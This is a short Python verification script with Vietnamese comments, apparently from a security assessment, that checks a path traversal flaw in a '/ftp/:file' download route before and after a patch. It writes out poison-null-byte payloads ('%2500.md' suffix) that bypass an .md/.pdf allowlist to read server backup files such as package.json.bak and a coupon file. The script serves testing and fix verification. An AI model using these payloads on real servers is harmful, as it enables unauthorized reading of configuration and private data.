"""TV2 — F02 Path traversal qua poison null byte ở route tải tệp (/ftp/:file).

Phát hiện: Semgrep báo `express-res-sendfile` tại `fileServer.ts` (res.sendFile với tên file từ người dùng).
Khai thác: allowlist `.md`/`.pdf` bị qua mặt bằng hậu tố `%2500.md` -> đọc tệp sao lưu phía máy chủ
(package.json.bak chứa cấu hình, coupons_2013.md.bak chứa mã giảm giá). Sau vá: chặn null byte (403).
"""
from common import AFTER, BEFORE, call, table

LEGIT = '/ftp/legal.md'
EXPLOITS = [('package.json.bak', '/ftp/package.json.bak%2500.md'),
            ('coupons_2013.md.bak', '/ftp/coupons_2013.md.bak%2500.md')]

rows = [('Môi trường', 'Yêu cầu', 'HTTP', 'Kết quả', 'Kết luận')]
for label, base in (BEFORE, AFTER):
    s, _ = call(base, 'GET', LEGIT)
    rows.append((label, 'GET /ftp/legal.md (hợp lệ)', s, 'nội dung tệp' if s == 200 else '-', 'tải tệp .md bình thường'))
    for name, path in EXPLOITS:
        s, _ = call(base, 'GET', path)
        leaked = s == 200
        rows.append((label, f'GET /ftp/{name}%2500.md', s,
                     'đọc được nội dung tệp' if leaked else '-',
                     f'LỖ HỔNG: lộ {name}' if leaked else 'an toàn: từ chối (403)'))
table(rows)
